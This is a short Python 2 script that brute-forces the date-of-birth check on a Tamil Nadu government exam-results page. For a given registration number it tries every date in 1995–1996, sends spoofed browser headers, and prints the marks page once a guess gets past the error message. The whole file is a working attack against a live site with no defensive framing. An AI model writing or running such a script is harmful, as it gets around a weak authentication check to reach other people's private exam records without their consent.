import urllib2
import urllib
from sys import argv
done = 0
i=1
j=1
k=1995
while k<=1996 and done == 0:
	j=1
	while j<=12 and done == 0:
		i=1
		while i<=31 and done ==0:
			dic = {}
			dic['regno'] = argv[1]
			if i<10:
				dic['dob'] = '0'+str(i)
			else:
				dic['dob'] = str(i)
			if j<10:
				dic['dob'] += '/0'+str(j)
			else:
				dic['dob'] += '/'+str(j)
			dic['dob'] += '/'+str(k)
			dic['B1'] = 'Get Marks'
			print 'Trying '+dic['dob']
			data = urllib.urlencode(dic)
			req = urllib2.Request("http://tnresults.nic.in/tncfplus/cfres.asp")
			req.add_header('User-Agent','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.17 (KHTML, like Gecko) Ubuntu Chromium/24.0.1312.56 Chrome/24.0.1312.56 Safari/537.17')
			req.add_header('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
			req.add_header('Host','tnresults.nic.in')
			req.add_header('Origin','http://tnresults.nic.in')
			req.add_header('Referer','http://tnresults.nic.in/tncfplus/cfform.htm')
			resp = urllib2.urlopen(req,data);

			data = resp.read()
			if 'Please check your Registration Number and DOB' not in data:
				if 'Pl provide DOB in correct format' not in data:
					print data
					done = 1
			i=i+1
		j=j+1
	k=k+1